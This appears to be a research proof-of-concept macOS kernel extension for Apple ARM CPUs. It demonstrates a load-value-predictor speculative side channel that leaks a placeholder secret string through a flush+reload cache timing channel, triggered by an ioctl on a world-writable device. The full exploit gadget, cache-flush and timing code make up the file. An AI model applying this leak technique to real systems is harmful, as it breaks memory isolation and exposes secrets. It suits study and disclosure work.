#include <mach/mach_types.h>
#include <libkern/libkern.h>
#include <libkern/OSKextLib.h>
#include <os/log.h>
#include <kern/thread.h>
#include <mach/thread_act.h>
#include <sys/types.h>
#include <sys/systm.h>
#include <sys/conf.h>
#include <miscfs/devfs/devfs.h>
#include <sys/proc.h>
#include <libkern/OSMalloc.h>
#include <kern/clock.h>
#include <arm/machine_routines.h>

#include "ioctl.h"

// Additional credit for creating a chardev on MacOS: https://phrack.org/issues/69/7.html

#define printf(fmt, ...) os_log(OS_LOG_DEFAULT, fmt, ##__VA_ARGS__)

extern "C" {
    static int control_open(dev_t dev, int flags, int devtype, struct proc *p);
    static int control_close(dev_t dev, int flags, int devtype, struct proc *p);
    static int control_ioctl(dev_t dev, u_long cmd, caddr_t data, int flag, struct proc *p);
    kern_return_t lvp_kernel_module_start(kmod_info_t *ki, void *d);
    kern_return_t lvp_kernel_module_stop(kmod_info_t *ki, void *d);
}

static struct cdevsw g_rk_device_cdevsw = {
    control_open,               /* open */
    control_close,              /* close */
    (d_read_t*)&nulldev,        /* read */
    (d_write_t*)&nulldev,       /* write */
    control_ioctl,              /* ioctl */
    eno_stop,                   /* stop */
    eno_reset,                  /* reset */
    NULL,                       /* tty's */
    eno_select,                 /* select */
    eno_mmap,                   /* mmap */
    eno_strat,                  /* strategy */
    eno_getc,                   /* getc */
    eno_putc,                   /* putc */
    0                           /* type */
};

int g_devindex = -1;
void *g_devnode = NULL;

#define PAGE_SZ 16384
#define CACHE_LINE_SZ 128
#define NUM_CACHELINES PAGE_SZ / CACHE_LINE_SZ
#define CACHE_HIT_THRESHOLD 105
#define REPS 250

OSMallocTag tag;
volatile void* page = NULL;
volatile void* channel = NULL;

#define READ(addr) (*(volatile uint8_t *)(addr))
#define FORCE_READ(addr, trash) (READ((uintptr_t)(addr) | (trash == 0xa)))

// Note: must serialize with isb and dsb ish
inline __attribute__((always_inline)) void clflush(void *ptr)
{
    asm volatile("dc civac, %0" : : "r"(ptr) : "memory");
}

inline __attribute__((always_inline)) void clflush_l1(void *ptr)
{
    asm volatile("dc cvau, %0" : : "r"(ptr) : "memory");
}

inline __attribute__((always_inline)) uint64_t rdtsc()
{
    uint64_t ts;
    asm volatile("dsb ish");
    asm volatile("isb");
    asm volatile("mrs %0, S3_2_c15_c0_0" : "=r"(ts) : :);
    asm volatile("isb");
    return ts;
}

// For shuffling cacheline indices in an array as to randomize
// the memory access pattern.
#define RAND_MAX 0x7fffffff // 2**31-1; https://github.com/apple-oss-distributions/xnu/blob/xnu-10063.121.3/bsd/libkern/random.c
void shuffle(volatile int *array, volatile int n)
{
    if (n > 1)
    {
        for (int i = 0; i < n - 1; i++)
        {
            volatile int j = i + random() / (RAND_MAX / (n - i) + 1);
            volatile int temp = array[j];
            array[j] = array[i];
            array[i] = temp;
        }
    }
}

kern_return_t lvp_kernel_module_start(kmod_info_t *ki, void *d) {
    os_log(OS_LOG_DEFAULT, "[*] Loading LVP module\n");

    // Check if DIT is enabled on EL1
    uint64_t DIT;

    asm volatile("mrs %0, DIT" : "=r"(DIT));
    os_log(OS_LOG_DEFAULT, "[*] Reading DIT: 0x%llx\n", DIT);

    os_log(OS_LOG_DEFAULT, "[+] Installing chardev\n");
    g_devindex = cdevsw_add(-1, &g_rk_device_cdevsw);
    if (g_devindex == -1) {
        printf("[ERROR] cdevsw_add() failed\n");
        return KERN_FAILURE;
    }
    // create the device
    g_devnode = devfs_make_node(makedev(g_devindex, 0), DEVFS_CHAR, UID_ROOT, GID_WHEEL, 0666, "lvp_poc");
    if (g_devnode == NULL) {
        printf("[ERROR] devfs_make_node() failed\n");
        return KERN_FAILURE;
    }

    tag = OSMalloc_Tagalloc("exp.lvp", OSMT_DEFAULT);
    page = OSMalloc(PAGE_SZ, tag);
    memset((void*)page, 0x41, PAGE_SZ);
    channel = OSMalloc(256 * PAGE_SZ, tag);
    memset((void*)channel, 0x99, 256 * PAGE_SZ);

    return KERN_SUCCESS;
}

kern_return_t lvp_kernel_module_stop(kmod_info_t *ki, void *d)
{
    os_log(OS_LOG_DEFAULT, "Unloading LVP module\n");
    if (g_devnode != NULL) devfs_remove(g_devnode);
    if (g_devindex != -1) cdevsw_remove(g_devindex, &g_rk_device_cdevsw);  

    OSFree((void*)page, PAGE_SZ, tag);
    OSFree((void*)channel, 256 * PAGE_SZ, tag);
    OSMalloc_Tagfree(tag);
    
    return KERN_SUCCESS;
}


static int control_open(dev_t dev, int flags, int devtype, struct proc *p) {
    return 0;
}

static int control_close(dev_t dev, int flags, int devtype, struct proc *p) {
    return 0;
}

const char *secret = "Mr and Mrs Dursley, of number four, Privet Drive, were proud to say that they were perfectly normal, thank you very much. They were the last people youd expect to be involved in anything strange or mysterious, because they just didnt hold with such nonsense.";

// Function to count matching bits between two chars
int countMatchingBits(char a, char b)
{
    int matchingBits = 0;
    char xorResult = a ^ b; // XOR the two chars

    // Count the number of zero bits in the XOR result
    for (int i = 0; i < 8; i++)
    {
        if (!(xorResult & (1 << i)))
        {
            matchingBits++;
        }
    }

    return matchingBits;
}

__attribute__((noinline)) void critical_section(volatile void *page, volatile int *indices, volatile unsigned char *channel_ptr, unsigned char *dummy_ptr, unsigned char *secret_ptr, int iters)
{
    // During training, both pointers are dummies and the load
    // value is 0x0. Hence, only the dummy is touched. On the single attack run,
    // we give dummy and secret, but the load value is changed to 0x1. Hence,
    // architecturally, only the dummy should hit. However, with the LVP, the
    // 0x0 load value executes transiently, accessing the secret.
    unsigned char *aop[2];
    aop[0] = secret_ptr;
    aop[1] = dummy_ptr;

    volatile uint64_t trash = 0;
    for (int i = 0; i < iters; i++)
    {
        volatile int idx = indices[i % NUM_CACHELINES];
        trash = FORCE_READ((volatile char *)page + idx * CACHE_LINE_SZ, trash);

        // Use load value as index into AoP, deref the selected ptr,
        // and then transmit the result over cache channel.
        unsigned char *ptr = aop[(uint8_t)trash];
        volatile unsigned char junk = channel_ptr[*ptr * PAGE_SZ];
    }
}

void poc() {
    // We don't need to initialize the kernel RNG.
    // Set up the target page.
    memset((void*)page, 0x0, PAGE_SZ);

    // Make array to hold the cacheline indices, then
    // shuffle the order of accesses.
    volatile int indices[NUM_CACHELINES];
    for (int i = 0; i < NUM_CACHELINES; i++)
    {
        indices[i] = i;
    }
    shuffle(indices, NUM_CACHELINES);

    // Allocate dummy page.lck
    void* dummy_page = OSMalloc(PAGE_SZ, tag);
    unsigned char *dummy_ptr;
    memset(dummy_page, 0xff, PAGE_SZ);
    dummy_ptr = (unsigned char *)dummy_page;

    // Allocate secret page.
    void *secret_page = OSMalloc(PAGE_SZ, tag);
    unsigned char *secret_ptr;
    strcpy((char *)secret_page, secret, strlen(secret));
    secret_ptr = (unsigned char *)secret_page;

    // Set up the cache channel.
    memset((void*)channel, 0x99, 256 * PAGE_SZ);
    unsigned char* channel_ptr = (unsigned char *)channel;

    clock_sec_t start_sec, end_sec;
    clock_nsec_t start_nsec, end_nsec;
    double elapsed_time;
    char result[strlen(secret) + 1];
    result[strlen(secret)] = '\0';

    clock_get_system_nanotime(&start_sec, &start_nsec);
    for (int pos = 0; pos < strlen(secret); pos++)
    {
        // Need to reset page to 0x0
        memset((void*)page, 0x0, PAGE_SZ);

        // Run the critical section a bunch of times for training. The AoP only contains
        // dummy pointers during training, so the secret is never architecturally touched.
        critical_section(page, indices, channel_ptr, dummy_ptr, dummy_ptr, REPS);

        // Flush the cache channel array.
        for (int set = 0; set < 256; ++set)
        {
            clflush((void *)(channel_ptr + set * PAGE_SZ));
        }

        // Change the ground truth load value to be 1 instead of 0. This makes the arch
        // load value for the gadget 0x1, but LVP will predict 0x0.
        memset((void*)page, 0x1, PAGE_SZ);

        // Flush the page's cachelines.
        for (int i = 0; i < NUM_CACHELINES; i++)
        {
            clflush((void *)((volatile char *)page + i * CACHE_LINE_SZ));
        }

        // Serialize the flush operations.
        asm volatile("isb");
        asm volatile("dsb ish");

        // Load the same PC again, activating the LVP. Here, aop[0] will
        // have secret, and aop[1] will have dummy.
        critical_section(page, indices, channel_ptr, dummy_ptr, secret_ptr + pos, 1);

        // Measure the cache channel.
        uint64_t timings[256];
        for (int i = 0; i < 256; ++i)
        {
            uint64_t start = rdtsc();
            volatile unsigned char trash = channel_ptr[i * PAGE_SZ];
            uint64_t end = rdtsc();
            timings[i] = end - start;
        }

        // Print out byte values that hit in the cache
        // EXCEPT for 0xff (which is the dummy value).
        for (int j = 0; j < 255; ++j)
        {
            if (timings[j] < CACHE_HIT_THRESHOLD)
            {
                result[pos] = (char)j;
                break;
            }
        }
    }
    clock_get_system_nanotime(&end_sec, &end_nsec);

    int matchingBits = 0;
    for (int pos = 0; pos < strlen(secret); pos++)
    {
        matchingBits += countMatchingBits(result[pos], secret[pos]);
        // os_log won't print the string if it looks too invalid.
        if (result[pos] < ' ' || result[pos] > 'z') result[pos] = '#';
    }

    os_log(OS_LOG_DEFAULT, "Secret: %s\n", secret);
    os_log(OS_LOG_DEFAULT, "Output: %s\n", result);
    os_log(OS_LOG_DEFAULT, "%d bits out of %lu total bits match\n", matchingBits, strlen(secret) * 8);

    elapsed_time = (end_sec - start_sec) +
                   (end_nsec - start_nsec) / 1E9;

    // There is no float formatting support for os_log in the kernel, so we just print the casted bits.
    os_log(OS_LOG_DEFAULT, "Timings: [%llx] sec\n", reinterpret_cast<uint64_t&>(elapsed_time));

    // Free the allocations.
    OSFree(dummy_page, PAGE_SZ, tag);
    OSFree(secret_page, PAGE_SZ, tag);
}

static int control_ioctl(dev_t dev, u_long cmd, caddr_t data, int flag, struct proc *p) {
    switch (cmd) {
        case IOCTL_TRIGGER_EXP_IN_KERNEL_READ: {
            poc();
            break;
        }
        default:
            break;
    }
        
    return 0;
}
